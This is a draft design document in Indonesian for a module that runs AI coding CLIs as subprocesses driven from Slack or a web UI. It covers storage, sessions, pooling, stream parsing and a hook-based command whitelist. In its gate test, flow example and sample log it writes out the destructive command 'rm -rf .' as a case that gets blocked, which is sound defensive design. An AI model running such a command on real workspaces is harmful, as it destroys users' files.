# Agents — Desain

Status: draft.
Update terakhir: 2026-05-08.

---

## 0. TL;DR

**Agents** = modul wick yang spawn AI CLI (claude/codex/gemini) sebagai subprocess + orchestrate via Slack thread atau UI. Tujuan: agent pakai semua MCP/skills/memory yang udah dipasang user di CLI native, tanpa wick re-implement apa-apa.

**Konsep utama:**

| Istilah | Apa | Lokasi |
|---|---|---|
| **Preset** | Template agent (instruksi/persona reusable) | `~/.wick/agents/presets/<nama>/agent.md` |
| **Project** | Repo + metadata. Master clone, banyak session pakai bareng via worktree | `~/.wick/agents/projects/<nama>/` |
| **Session** | 1 thread Slack atau 1 conversation UI. Punya worktree + log sendiri | `~/.wick/agents/sessions/<id>/` |
| **Agent** | Instance dalam session, dibikin dari preset. 1 session bisa banyak agent, 1 aktif | entry di `sessions/<id>/agents.json` |
| **Agent Pool** | Manage berapa subprocess jalan bersamaan (default 2), idle TTL kill | in-memory |
| **Command Gate** | Whitelist shell commands via CLI hooks (`wick-gate` binary check exit code) | `~/.wick/agents/sessions/<id>/commands.jsonl` |
| **Transport** | Sumber pesan: Slack (thread), UI (langsung), API (future) | abstraksi di `internal/agents/transport.go` |

**Storage decision**: semua state agents di **filesystem** (`~/.wick/agents/`), bukan DB. Backup = `tar czf`. Restart = scan folder, idempotent.

**Resume**: wick simpan `cli_session_id` per agent di `agents.json`. Subprocess di-kill saat idle TTL → revive pakai `claude --resume <id>` saat pesan baru masuk.

**Reading order**: §1 implementation roadmap → §2 latar belakang → §3 konsep → §4.1 storage layout (anchor) → §4.2-4.8 entitas + runtime → §5 alur lengkap → §6 struktur kode → §15 security → §16 testing.

---

## 1. Implementation Roadmap

Urutan kerja dipecah jadi 6 fase. Tiap fase butuh fase sebelumnya selesai. Update checkbox `- [ ]` → `- [x]` saat task selesai.

**Scope MVP**: Phase 1 → 4 + claude backend doang. Codex/Gemini & Slack di phase setelahnya.

### Progress Tracker

Update tabel ini saat phase selesai. Format `[ ] / [x] / [~] in-progress`.

| Phase | Status | Catatan |
|---|---|---|
| Phase 1 — Foundation | `[x]` | `internal/agents/` storage + config + preset + project + session + registry + manager. 28 unit tests hijau. |
| Phase 2 — Subprocess + Pool | `[ ]` | — |
| Phase 3 — Command Gate | `[ ]` | — |
| Phase 4 — UI Manager Tool (MVP) | `[ ]` | — |
| Phase 5 — Slack Transport | `[ ]` | — |
| Phase 6 — Polish | `[ ]` | — |

### Dependency graph

```
Phase 1 (foundation)
  ↓
Phase 2 (subprocess + pool, claude)
  ↓               ↓
Phase 3 (gate)   Phase 4 (UI) ← entry point user dimulai sini
                  ↓
                Phase 5 (slack)
                  ↓
                Phase 6 (multi-CLI + polish)
```

Phase 3 dan 4 bisa parallel kalau ada 2 dev.

### Phase 1 — Foundation (storage + entitas, no subprocess)

Tujuan: bisa buat/hapus project + session dari kode (test). Belum ada subprocess.

- [x] **1.1** FS helpers: atomic write json, append jsonl, read tail, scan folder → `internal/agents/storage.go`
- [x] **1.2** Config structs (`GeneralConfig`, `SlackConfig`, `WorkspaceConfig`) + bootstrap seed → `internal/agents/config.go`
- [x] **1.3** Preset CRUD: `presets/<nama>/agent.md` read/write → `internal/agents/preset.go`
- [x] **1.4** Project CRUD: `meta.json` + `workspace/` + `git init` / `git clone` → `internal/agents/project.go`
- [x] **1.5** Session CRUD: `meta.json`, `agents.json`, `agent.md` snapshot, `git worktree add/remove` → `internal/agents/session.go`
- [x] **1.6** In-memory registry: boot scan, sync write per-file + memory → `internal/agents/registry.go` + `manager.go`
- [x] **1.7** Unit test seluruh CRUD pakai `t.TempDir()` → `internal/agents/*_test.go` (28 tests)

**Exit criteria**: bisa create project + session dari Go test, scan folder = same as memory, restart idempotent.

### Phase 2 — Subprocess + Pool (claude only)

Tujuan: bisa spawn claude subprocess, kirim input, capture output, idle TTL kill.

- [ ] **2.1** Internal `AgentEvent` struct + `EventParser` interface → `internal/agents/events.go`
- [ ] **2.2** `ClaudeParser` — parse stream-json → AgentEvent, extract `session_id` → `internal/agents/events.go`
- [ ] **2.3** `Agent` struct + lifecycle: spawn, stdin write, kill, idle timer → `internal/agents/agent.go`
- [ ] **2.4** State machine per agent (idle/thinking/running_tool/responding) → `internal/agents/state.go`
- [ ] **2.5** Pipeline event → `conversation.jsonl` + `agents.json` (cli_session_id capture) → `internal/agents/store.go`
- [ ] **2.6** Agent Pool: max_concurrent slot mgmt + FIFO queue → `internal/agents/pool.go`
- [ ] **2.7** Resume flow: spawn dengan `--resume <cli_session_id>` kalau ada → `internal/agents/agent.go`
- [ ] **2.8** Message buffer saat queued — append, drain saat slot dapat → `internal/agents/session.go`
- [ ] **2.9** Integration test: spawn claude in `t.TempDir()` workspace, send "hello", expect response → `internal/agents/integration_test.go`

**Exit criteria**: Go test trigger session message → claude jalan di worktree → output di-tulis ke jsonl → idle TTL kill → revive resume sukses.

### Phase 3 — Command Gate

Tujuan: shell command yang tidak whitelisted di-block oleh CLI hook.

- [ ] **3.1** `wick-gate` binary: stdin parser, glob whitelist match, exit code → `cmd/wick-gate/main.go`
- [ ] **3.2** Hook config generator (Claude `settings.json`) → `internal/agents/gate.go`
- [ ] **3.3** Inject hook config + `wick-gate` path ke env sebelum spawn → `internal/agents/agent.go`
- [ ] **3.4** Append ke `commands.jsonl` saat hook keputusan allow/block → `wick-gate` + `internal/agents/store.go`
- [ ] **3.5** Fail-safe: hook timeout (3s) → block → `cmd/wick-gate/main.go`
- [ ] **3.6** Test: feed `rm -rf .` ke claude → block, log ke commands.jsonl → `internal/agents/gate_test.go`

**Exit criteria**: claude exec command yang tidak whitelisted → di-block, command_log entry ada.

### Phase 4 — UI Manager Tool (MVP transport: UI)

Tujuan: bisa kelola agent dari web UI tanpa Slack. End-to-end test path.

- [ ] **4.1** Tool registration di `internal/tools/agents/tool.go` (sesuai tool-module.md) → `internal/tools/agents/`
- [ ] **4.2** Layout templ: nav kiri (Overview/Sessions/Projects/Presets/Queue/Config) + content kanan → `internal/tools/agents/view.templ`
- [ ] **4.3** Halaman Overview, Sessions list, Projects list, Presets list, Queue → `view.templ` per page
- [ ] **4.4** Session detail: tab Conversation/Commands/Raw + composer kirim message → `view.templ`
- [ ] **4.5** UI transport: handler `POST /sessions/{id}/send` → IncomingMessage → `internal/agents/ui_transport.go`
- [ ] **4.6** Action buttons: Resume / Kill / Reset / Copy command per agent → `view.templ` + handler
- [ ] **4.7** SSE broadcaster `GET /stream` + EventSource client → `internal/agents/stream.go`, `js/agents.js`
- [ ] **4.8** Pagination listing (50/page, scan folder + sort) → handler
- [ ] **4.9** Config pages auto-render dari `wick:"..."` tag → (ikut wick tag system, no extra code)
- [ ] **4.10** Smoke test: buka `/tools/agents`, klik Send → claude jalan, conversation muncul real-time → manual

**Exit criteria MVP**: tanpa Slack, user bisa kelola full lifecycle agent dari web UI. End-to-end claude works.

### Phase 5 — Slack Transport

Tujuan: trigger agent dari Slack thread. Reaction lifecycle + final message + meta-command.

- [ ] **5.1** Slack Socket Mode listener (default), HTTP Event API (alternatif) → `internal/agents/slack.go`
- [ ] **5.2** Access control matcher (everyone/users/groups) → `internal/agents/slack.go`
- [ ] **5.3** Reaction lifecycle: ⏳→⚙️→✅/🚫/❌ → `internal/agents/slack.go`
- [ ] **5.4** Final response message + chunking >4000 char → `internal/agents/slack.go`
- [ ] **5.5** Meta-command parser: ganti agent / pakai project / reset / status / dashboard / link / log → `internal/agents/metacmd.go`
- [ ] **5.6** `dashboard` command: build URL dari `PublicURL` + thread_ts → `internal/agents/metacmd.go`
- [ ] **5.7** Slack rate limit handling (exponential backoff) → `internal/agents/slack.go`
- [ ] **5.8** Manual test: kirim pesan di Slack → reaction berubah, final reply muncul → manual

**Exit criteria**: full Slack flow works.

### Phase 6 — Polish (multi-CLI + maintenance)

- [ ] **6.1** `CodexParser` — parse JSONL → AgentEvent → `internal/agents/events.go`
- [ ] **6.2** `GeminiParser` — parse stream-json → AgentEvent → `internal/agents/events.go`
- [ ] **6.3** Codex resume flow (read `~/.codex/sessions/...`) → `internal/agents/agent.go`
- [ ] **6.4** Gemini resume flow (env `GEMINI_SESSION_ID`) → `internal/agents/agent.go`
- [ ] **6.5** Hook config untuk Codex (`PermissionRequest`) + Gemini (`BeforeTool`) → `internal/agents/gate.go` + `wick-gate`
- [ ] **6.6** Retention job: gzip rotate jsonl + hapus archive lama → `internal/jobs/agents-cleanup/`
- [ ] **6.7** Restart recovery test: stop wick mid-session, start lagi, lanjut → `integration_test.go`
- [ ] **6.8** Search lintas session (scan jsonl, simple grep) di UI → `internal/tools/agents/`
- [ ] **6.9** Documentation user-facing (how-to: setup Slack, buat project, dll) → `docs/guide/agents.md`

**Exit criteria**: 3 backend bekerja, retention jalan, doc user lengkap.

---

## 2. Latar Belakang

Wick sudah menjadi MCP server. Claude CLI dan Codex CLI mendukung MCP server eksternal via config. Dari sini muncul peluang: spawn claude/codex CLI sebagai subprocess, inject MCP config ke wick endpoint, dan agent langsung mendapat akses semua tools/connectors wick secara otomatis.

**Agents** adalah modul orchestration yang mengatur siklus hidup AI CLI agent (claude atau codex), routing session via Slack thread, kontrol akses command, dan dashboard real-time via HTTP stream.

Analoginya mirip Open Claw tapi native Go, didesain sebagai bagian dari wick bukan standalone tool.

---

## 3. Konsep Inti

Agents adalah modul **first-class** di wick — sejajar dengan Tools, Jobs, dan Connectors. Punya menu sendiri di UI, config terpisah per concern, dan manager yang di-expose sebagai Tool.

```
Pesan masuk (Slack thread atau UI composer)
  → Transport         (slack | ui | api)
  → Access Control    (everyone | users | groups — Slack only)
  → Session Manager   (lookup/create folder sessions/<id>/)
  → Meta-command check (ganti agent X, reset, dashboard, dll → wick handle)
  → Agent Pool        (slot tersedia? → run, else queue)
  → Subprocess        (claude/codex/gemini CLI + worktree)
  → Command Gate      (setiap perintah di-check whitelist via CLI hook)
  → Response          → Slack reaction + final message (atau langsung di UI)
  → Dashboard         ← SSE real-time state
```

**Prinsip:**
- 1 thread Slack atau 1 conversation UI = 1 session (key = thread_ts atau UUID)
- 1 session bisa punya banyak named agents, hanya 1 aktif di satu waktu
- Switch agent via meta-command yang di-intercept wick sebelum masuk subprocess
- Setiap agent dibikin dari preset di `presets/<nama>/agent.md`, di-snapshot ke `sessions/<id>/agent.md`
- Agent Pool menghitung slot dari total subprocess aktif lintas semua session
- Command gate: tidak terdaftar → auto-block + log, tidak ada arbitrary shell
- Semua state agents di filesystem (`~/.wick/agents/`), bukan DB — backup = tar gz, restart = scan folder

---

## 4. Komponen

Section ini berurutan dari **anchor** (storage layout di filesystem) → **entitas** (project, session, agent) → **mekanika runtime** (gate, streaming, transport, dashboard). Kalau pertama kali baca, mulai dari §4.1 — semua section setelahnya merujuk balik ke struktur folder di sana.

### 4.1 Storage Layout

Semua state agents tinggal di filesystem `~/.wick/agents/`. Tidak ada DB tabel agent-specific (lihat §11). Tiga konsep besar:

| Konsep | Folder | Apa itu |
|---|---|---|
| **Preset** | `presets/<nama>/` | Template agent — instruksi/persona reusable |
| **Project** | `projects/<nama>/` | Repo + metadata. Master clone, dipakai banyak session via worktree |
| **Session** | `sessions/<id>/` | 1 thread Slack atau 1 conversation UI. Punya worktree sendiri, log sendiri |

#### Folder lengkap

```
~/.wick/agents/
│
├── presets/                          ← reusable agent templates
│   ├── default/agent.md
│   ├── backend/agent.md
│   └── reviewer/agent.md
│
├── projects/                         ← PROJECT entries (1 folder = 1 project)
│   └── frontend/
│       ├── meta.json                 ← project metadata (lihat §4.2)
│       └── workspace/                ← MASTER clone (read-only secara konvensi)
│           ├── .git/                 ← git objects, di-share antar worktree
│           ├── CLAUDE.md             ← project context asli
│           └── src/
│
└── sessions/                         ← SESSION entries (1 folder = 1 session)
    ├── T123/                         ← thread_ts dari Slack
    │   ├── meta.json                 ← session metadata (lihat §4.3)
    │   ├── agents.json               ← agent registry per session (cli_session_id, dll)
    │   ├── agent.md                  ← snapshot preset aktif
    │   ├── conversation.jsonl        ← user/assistant turn log (append-only)
    │   ├── commands.jsonl            ← gate log allowed/blocked
    │   ├── raw.jsonl                 ← raw stream events (optional, retention agresif)
    │   └── workspace/                ← SESSION worktree (agent edit di sini)
    │       ├── .git                  ← FILE pointer ke ../../projects/frontend/workspace/.git/worktrees/T123
    │       ├── CLAUDE.md             ← merged: project CLAUDE.md + agent.md
    │       └── src/                  ← independent dari session lain, branch session/T123
    │
    └── 9b7e-uuid-from-ui/            ← session origin=ui pakai UUID, bukan thread_ts
        └── ...
```

#### Project workspace vs session workspace

Dua-level workspace = **1 clone, banyak worktree**. Tujuan: hemat disk + isolasi konflik antar session.

| Aspek | `projects/<nama>/workspace/` | `sessions/<id>/workspace/` |
|---|---|---|
| **Apa** | Master clone (full git repo) | Git worktree dari project workspace |
| **Lifecycle** | Dibuat sekali saat project create, hidup selama project ada | Dibuat per session, hapus saat session deleted |
| **Branch** | Default repo branch (main/master) | `session/<id>` (terpisah, no konflik) |
| **Edit langsung?** | Tidak — read-only secara konvensi | Iya — agent edit di sini |
| **Yang nulis** | `git clone`, `git pull` (dari wick atau user) | Agent (claude/codex bash tool) |
| **`.git`** | Folder real (objects + refs) | File pointer ke project's `.git/worktrees/<id>` |
| **CLAUDE.md** | Versi asli dari repo | Merged: project CLAUDE.md + session agent.md |
| **Disk** | Full clone (objects ~MB-GB) | Cuma working files (objects shared) |
| **Cwd subprocess** | Tidak pernah | Selalu (agent spawn di sini) |

Pattern git worktree adalah sweet spot:

| | Clone per session | Symlink shared | Git worktree |
|---|---|---|---|
| Disk usage | ❌ boros | ✅ ringan | ✅ ringan (objects shared) |
| Konflik antar session | ✅ tidak ada | ❌ bisa konflik | ✅ tidak ada (branch terpisah) |
| Independensi edit | ✅ | ❌ | ✅ |

#### Aturan storage: kapan jsonl, kapan json

| Pattern | Untuk | Karakter |
|---|---|---|
| **`*.json`** (`meta.json`, `agents.json`) | Metadata kecil, sering di-update | Atomic rename (tmp → final). Read = full file load, kecil <1KB |
| **`*.jsonl`** (`conversation.jsonl`, `commands.jsonl`, `raw.jsonl`) | Log yang growing, append-only | Append + fsync. Read = tail / paginate via seek |

**Atomic write pattern** untuk json:

```go
tmp := filepath.Join(dir, "meta.json.tmp")
os.WriteFile(tmp, data, 0644)
os.Rename(tmp, filepath.Join(dir, "meta.json"))  // atomic on POSIX
```

**Header `_meta`** di line pertama tiap jsonl:
```jsonl
{"_meta":{"version":1,"format":"wick-conv-v1","session":"T123"}}
```
Reader skip line yang punya `_meta`.

#### Restart recovery

Saat wick start, scan folder untuk re-build in-memory registry:

```
wick start
  → readdir projects/      → load projects[name] = meta
  → readdir sessions/      → load sessions[id] = meta + agents
  → reset semua agent.status = idle (subprocess run sebelumnya udah mati)
  → cli_session_id persist di agents.json → resume normal saat pesan masuk
```

File = source of truth. Memory = view yang cepat. Restart = idempotent.

#### Kenapa filesystem, bukan DB

| | DB rows | filesystem (folder + json/jsonl) |
|---|---|---|
| Schema migration | wajib (CREATE TABLE, ALTER) | tidak ada |
| Listing | SQL ORDER BY | readdir + sort (cepat <500 entry) |
| Lookup detail | indexed query | path direct (`sessions/<id>/meta.json`) |
| Backup | dump SQL | `tar czf wick-agents.tgz ~/.wick/agents/` |
| Delete | DELETE + cascade | `rm -rf` |
| Tooling debug | `sqlite3` query | `cat`, `jq`, file explorer |
| Search lintas session | ✅ SQL FTS | ⚠️ scan banyak file (acceptable untuk skala wick) |

Tradeoff yang diterima: filter complex lintas session = scan in-app, bukan SQL. OK untuk skala wick agents (tool internal, bukan SaaS multi-tenant).

### 4.2 Project

Project = repo + preset default + sessions yang attach. Disimpan sebagai folder di `~/.wick/agents/projects/<nama>/` — nama folder = identitas (unique constraint via filesystem, no separate `id` field).

#### `projects/<nama>/meta.json`

Field yang masuk akal di-deklarasikan (bukan derive):

```json
{
  "repo_url": "https://github.com/.../frontend.git",
  "default_preset": "default",
  "default_backend": "claude",
  "description": "Customer dashboard frontend",
  "tags": ["frontend", "team-a"],
  "created_at": "2026-05-08T10:00:00Z"
}
```

| Field | Wajib? | Catatan |
|---|---|---|
| `repo_url` | optional | Kosong = project tanpa repo (lihat lifecycle bawah) |
| `default_preset` | wajib | Nama preset di `presets/<...>/` — di-snapshot saat session attach |
| `default_backend` | optional | claude / codex / gemini. Default fallback ke `GeneralConfig.DefaultBackend` |
| `description`, `tags` | optional | Display di UI, filter |
| `created_at` | wajib | Audit |

Yang **tidak** di meta.json (derivable, jangan duplikasi):

| Info | Source |
|---|---|
| Last commit / current branch | `git -C workspace rev-parse HEAD` / `git branch --show-current` |
| Worktree list aktif | `git -C workspace worktree list` |
| Disk usage | `du -sh workspace/` |
| Sessions yang attach | scan `sessions/*/meta.json`, filter `project == <nama>` |

Prinsip: explicit declaration untuk wick-invented state, derive untuk git/filesystem-authoritative state.

#### Lifecycle project

```
Buat project "frontend" + repo_url
  → cek projects/frontend/ sudah ada? → tolak (nama dipakai)
  → mkdir projects/frontend/
  → tulis projects/frontend/meta.json
  → git clone <repo_url> projects/frontend/workspace/
  → buat presets/default/agent.md kalau belum ada

Buat project tanpa repo
  → mkdir projects/standalone/workspace/
  → git init projects/standalone/workspace/  ← tetap pakai git, supaya worktree pattern jalan
  → commit awal kosong (biar bisa branch + worktree)

Session T123 pakai project "frontend" (lihat §4.3 untuk detail session create)
  → git worktree add sessions/T123/workspace -b session/T123
    (dari projects/frontend/workspace)
  → snapshot: copy presets/<default>/agent.md → sessions/T123/agent.md
  → merge: cat workspace/CLAUDE.md sessions/T123/agent.md > sessions/T123/workspace/CLAUDE.md

Session T456 juga pakai "frontend"
  → git worktree add sessions/T456/workspace -b session/T456
  → independent dari T123, branch berbeda, tidak konflik
```

**Reuse**: T456 minta project "frontend" yang udah ada → wick stat `projects/frontend/`, skip clone, langsung buat worktree baru.

**Decision: project tanpa repo wajib `git init`.** Worktree pattern butuh git repo. Kalau user buat project tanpa repo_url, wick tetap `git init` di workspace + commit awal kosong. Konsistensi handler, tidak ada special case.

#### Operasi project

| Aksi | Cara |
|---|---|
| Create | mkdir + tulis meta.json + clone (atau git init) |
| Edit | Update `meta.json` (atomic rename). Rename = `os.Rename` folder + sync session metadata yang attach |
| Delete | `git -C workspace worktree remove` semua attach session, lalu `rm -rf projects/<nama>/` |
| Git pull | `git -C projects/<nama>/workspace pull origin <default-branch>` |
| List worktrees | `git -C workspace worktree list` |
| List sessions yang attach | scan `sessions/`, filter `meta.json.project == <nama>` |

#### Manage dari Slack (meta-command)

| Command | Aksi |
|---|---|
| `buat project frontend` | Create project tanpa repo (auto `git init`) |
| `buat project frontend https://github.com/...` | Create + auto-clone |
| `pakai project frontend` | Attach session ke project ini, buat worktree |
| `ganti project api` | Switch session ke project lain (buat worktree baru, agent.md di-snapshot ulang) |
| `list project` | Reply list semua project (scan `projects/`) |

### 4.3 Session

Session = 1 thread Slack atau 1 conversation UI. Routing key:

| Origin | Session ID |
|---|---|
| Slack | `thread_ts` (e.g. `1715167891.234567`) |
| UI / API | UUID generate wick |

Disimpan sebagai folder `~/.wick/agents/sessions/<id>/` — lihat §4.1 untuk struktur file lengkap.

#### `sessions/<id>/meta.json`

```json
{
  "project": "frontend",
  "origin": "slack",
  "channel_id": "C123ABC",
  "active_agent": "backend",
  "status": "idle",
  "created_at": "2026-05-08T10:00:00Z",
  "last_active": "2026-05-08T10:05:00Z"
}
```

| Field | Catatan |
|---|---|
| `project` | Nama project yang attach (`null` kalau session belum attach project) |
| `origin` | `slack` / `ui` / `api` — transport asal |
| `channel_id` | Slack channel ID (null kalau origin != slack) |
| `active_agent` | Nama agent aktif saat ini (key di agents.json) |
| `status` | `idle` / `queued` / `running` (status pool) |
| `last_active` | Update tiap aktivitas — buat sort listing + idle TTL |

#### `sessions/<id>/agents.json`

Registry agent dalam session. 1 session bisa punya banyak named agents, hanya 1 aktif di satu waktu (ditunjuk `meta.json.active_agent`).

```json
[
  {
    "name": "backend",
    "backend": "claude",
    "cli_session_id": "abc-123-def",
    "status": "idle",
    "created_at": "2026-05-08T10:00:00Z",
    "last_active": "2026-05-08T10:05:00Z"
  },
  {
    "name": "reviewer",
    "backend": "claude",
    "cli_session_id": null,
    "status": "idle",
    "created_at": "2026-05-08T10:30:00Z"
  }
]
```

**`cli_session_id`** kunci untuk resume — wick simpan ini supaya `claude --resume <id>` ambil sesi yang tepat (lihat §5.2).

#### Lifecycle session

```
Pesan masuk Slack di thread T123 (atau request POST dari UI)
  → cek sessions/T123/ ada?
    → tidak: mkdir + tulis meta.json + agents.json kosong + buat worktree
    → ada: load meta + agents
  → routing ke pool / queue (lihat §4.4 Agent Pool)
  → spawn subprocess di sessions/T123/workspace/
  → log conversation/commands/raw ke jsonl masing-masing

Subprocess idle TTL hit
  → kill subprocess
  → update agents.json: status=idle (cli_session_id tetap)
  → update meta.json: status=idle, last_active=now

Pesan baru masuk
  → revive: spawn dengan --resume <cli_session_id>

Switch agent (Slack: "ganti agent reviewer")
  1. update meta.json: active_agent="reviewer"
  2. agent sebelumnya tetap hidup sampai TTL idle habis
  3. agent tujuan: kalau belum ada di agents.json → tambah entry, snapshot preset → agent.md
  4. spawn subprocess agent "reviewer" (kalau belum ada)
  5. input berikutnya diteruskan ke subprocess "reviewer"

Reset session
  → kill semua subprocess
  → truncate conversation.jsonl, commands.jsonl, raw.jsonl (sisain header _meta)
  → clear cli_session_id di agents.json
  → re-snapshot agent.md dari preset terbaru
  → re-merge CLAUDE.md

Delete session
  → kill semua subprocess
  → git worktree remove sessions/<id>/workspace
  → rm -rf sessions/<id>/
```

**Folder = source of truth** untuk semua state session. Restart wick scan folder ulang.

### 4.4 Agent Pool

Pool mengatur jumlah subprocess agent yang berjalan bersamaan, lintas semua session.

```
┌──────────────────────────────────────────┐
│              Agent Pool                  │
│                                          │
│  [slot 1: session-A / agent "backend"]   │
│  [slot 2: session-B / agent "default"]   │
│  [queue: session-C, session-A/reviewer]  │
└──────────────────────────────────────────┘
```

| Knob | Default | Catatan |
|---|---|---|
| `max_concurrent` | 2 | Batas subprocess aktif lintas session (config di §8.1) |
| Queue | FIFO | Session menunggu slot kosong |
| TTL idle | 60s | Subprocess di-kill kalau **benar-benar idle** (no I/O activity) lebih dari threshold. Timer pause saat agent sedang proses |
| Revive | otomatis | Pesan baru ke session yang subprocess-nya sudah idle/killed → masuk pool lagi (resume `cli_session_id` dari `agents.json`) |

**State yang persist meski subprocess down**: semua di filesystem (lihat §4.1). cli_session_id, conversation log, command log — tidak hilang. Pool cuma manage subprocess lifecycle, bukan data.

### 4.5 Command Gate

Semua tiga CLI support **pre-execution hooks** — hook dipanggil sebelum command dijalankan, bisa return allow atau block. Wick memanfaatkan ini untuk whitelist enforcement.

#### Mekanisme per CLI

| CLI | Hook | Cara block | Dokumentasi |
|---|---|---|---|
| **Claude CLI** | `PreToolUse` di `settings.json` | Exit code `2` = block, `0` = allow | [hooks-guide](https://code.claude.com/docs/en/hooks-guide) |
| **Codex CLI** | `PermissionRequest` hook | `{"behavior":"deny"}` di stdout | [codex hooks](https://developers.openai.com/codex/hooks) |
| **Gemini CLI** | `BeforeTool` hook | JSON response block (stdout harus pure JSON) | [gemini hooks](https://geminicli.com/docs/hooks/) |

Wick menulis hook config ke temp dir sebelum spawn subprocess. Hook memanggil wick gate binary yang check whitelist dan return allow/block.

```
CLI subprocess mau jalanin: rm -rf .
  → panggil hook (wick-gate binary)
  → wick-gate terima: {"tool":"bash","input":{"command":"rm -rf ."}}
  → cek whitelist: "rm *" tidak ada
  → return: block (exit 2 / JSON deny)
  → CLI batalkan eksekusi
  → wick log: blocked
```

#### Hook Config yang Di-generate Wick

**Claude** (`settings.json` di temp working dir):
```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{"type": "command", "command": "wick-gate check"}]
    }]
  }
}
```

**Codex** (`~/.codex/config.json` atau env):
```json
{
  "hooks": {
    "permissionRequest": {"command": "wick-gate check-codex"}
  }
}
```

**Gemini** (`~/.gemini/settings.json`):
```json
{
  "hooks": {
    "beforeTool": {"command": "wick-gate check-gemini"}
  }
}
```

#### Whitelist & Log

```go
type CommandGate struct {
    Allowed []CommandRule
}

type CommandRule struct {
    Pattern string   // glob, e.g. "git *", "ls *", "cat *"
    Scope   string   // path prefix yang diizinkan (opsional)
}
```

- Tidak ada di whitelist → auto-block
- Semua eksekusi (allowed dan blocked) → append ke `sessions/<id>/commands.jsonl`

Format log (jsonl):
```jsonl
{"ts":"2026-05-08T10:23:11Z","agent":"backend","cmd":"git clone ...","status":"allowed"}
{"ts":"2026-05-08T10:23:15Z","agent":"backend","cmd":"rm -rf .","status":"blocked"}
```

### 4.6 Streaming States & Raw Output

Setiap CLI emit events yang berbeda saat proses. Wick parse events ini untuk update state ke Slack dan dashboard secara real-time.

#### Event Types per CLI

| State | **Claude CLI** | **Codex CLI** | **Gemini CLI** |
|---|---|---|---|
| **Flag streaming** | `--output-format stream-json` | `--json` | `--output-format stream-json` |
| **Format** | Newline-delimited JSON (SSE-style) | JSONL | Newline-delimited JSON |
| **Session start** | `message_start` | `thread.started` | `init` |
| **Thinking / reasoning** | `content_block_start {type:"thinking"}` + `thinking_delta` | Bagian dari `turn.started` (tidak eksplisit) | Tidak didokumentasikan |
| **Text streaming** | `content_block_delta {type:"text_delta"}` | `item.agent_message` | `message {role:"assistant"}` |
| **Tool dipanggil** | `content_block_start {type:"tool_use", name:"Bash"}` | `item.command_execution` | `tool_use {name:"..."}` |
| **Tool selesai** | `content_block_delta {type:"input_json_delta"}` → `content_block_stop` | `turn.completed` | `tool_result` |
| **Response selesai** | `message_stop` | `turn.completed` | `result` |
| **Error** | `error` | `turn.failed` | Tidak didokumentasikan |
| **Session ID** | Field `session_id` di setiap event | `thread_id` di `thread.started` | `session_id` di `init` + env `GEMINI_SESSION_ID` |
| **Granularitas** | ✅ Fine-grained (delta per karakter) | ⚠️ Turn-based | ⚠️ Moderate |
| **Thinking visible** | ✅ Ya, `thinking_delta` | ❌ Tidak eksplisit | ❌ Tidak didokumentasikan |
| **Docs** | [streaming](https://platform.claude.com/docs/en/build-with-claude/streaming) | [noninteractive](https://developers.openai.com/codex/noninteractive) | [headless](https://geminicli.com/docs/cli/headless/) |

#### Contoh Raw Event

**Claude** (`--output-format stream-json`):
```json
{"type":"content_block_start","index":0,"content_block":{"type":"thinking"}}
{"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"Perlu clone repo dulu..."}}
{"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"t1","name":"Bash"}}
{"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\"command\":\"git clone"}}
{"type":"content_block_stop","index":1}
{"type":"content_block_delta","index":2,"delta":{"type":"text_delta","text":"Repo berhasil di-clone."}}
{"type":"message_stop","session_id":"abc-123"}
```

**Codex** (`--json`):
```json
{"type":"thread.started","thread_id":"xyz-456"}
{"type":"turn.started","turn_id":"t1"}
{"type":"item.command_execution","command":"git clone https://..."}
{"type":"item.agent_message","content":"Repo berhasil di-clone."}
{"type":"turn.completed"}
```

**Gemini** (`--output-format stream-json`):
```json
{"type":"init","session_id":"gem-789","model":"gemini-2.0-flash"}
{"type":"tool_use","id":"c1","name":"run_shell","arguments":{"command":"git clone ..."}}
{"type":"tool_result","tool_use_id":"c1","content":"Cloning into..."}
{"type":"message","role":"assistant","content":"Repo berhasil di-clone."}
{"type":"result","usage":{"input_tokens":100,"output_tokens":30}}
```

#### Yang Wick Harus Implement (Tidak butuh ubah agent.md)

Ini murni kode di `events.go` dan `slack.go`. `agent.md` tidak perlu diubah — streaming adalah runtime behavior, bukan konfigurasi preset.

**Step 1 — Internal event type (abstraksi lintas CLI):**

Setiap CLI punya format berbeda. Wick normalkan ke satu struct internal:

```go
type AgentEvent struct {
    Type      EventType // Thinking, TextDelta, ToolUse, ToolResult, Done, Error, SessionID
    Text      string    // isi text (untuk TextDelta)
    ToolName  string    // nama tool (untuk ToolUse, e.g. "Bash")
    ToolInput string    // input tool sebelum dieksekusi (untuk gate check)
    SessionID string    // di-extract dari event, disimpan ke agents.json
    Raw       string    // JSON mentah dari CLI (untuk raw view dashboard)
}
```

**Step 2 — Parser per CLI (`events.go`):**

```go
type EventParser interface {
    Parse(line string) (AgentEvent, error)
}

// ClaudeParser baca stream-json events
// content_block_start {type:"thinking"} → EventType.Thinking
// content_block_delta {type:"text_delta"} → EventType.TextDelta
// content_block_start {type:"tool_use", name:"Bash"} → EventType.ToolUse
// message_stop → EventType.Done + extract session_id

// CodexParser baca JSONL events
// item.command_execution → EventType.ToolUse
// item.agent_message → EventType.TextDelta
// turn.completed → EventType.Done

// GeminiParser baca stream-json events
// tool_use → EventType.ToolUse
// message {role:"assistant"} → EventType.TextDelta
// result → EventType.Done + extract session_id dari init event
```

**Step 3 — State machine per subprocess (`agent.go`):**

```
State: idle → thinking → running_tool → responding → idle

idle        : subprocess menunggu input
thinking    : dapat Thinking event dari CLI
running_tool: dapat ToolUse event, command gate sedang check
responding  : dapat TextDelta event, text sedang di-stream
idle        : dapat Done event, subprocess selesai proses
```

**Step 4 — Slack handler (`slack.go`) — minimal di Slack, detail di dashboard:**

Filosofi: Slack thread = output bersih (tidak nyepam channel diskusi). Detail step-by-step ada di wick dashboard. Dashboard URL on-demand via meta-command `dashboard`/`link`.

Yang dikirim ke Slack per state:

| State | Aksi ke Slack |
|---|---|
| Pesan masuk, queued | Add reaction ⏳ ke message user |
| Pesan masuk, processing dimulai | Replace reaction ⏳ → ⚙️ |
| Tool call | (tidak di-post — cukup di dashboard) |
| Blocked command | (tidak di-post — final reply mention "blocked, lihat dashboard") |
| Thinking / TextDelta / ToolResult | (tidak di-post — buffer untuk final) |
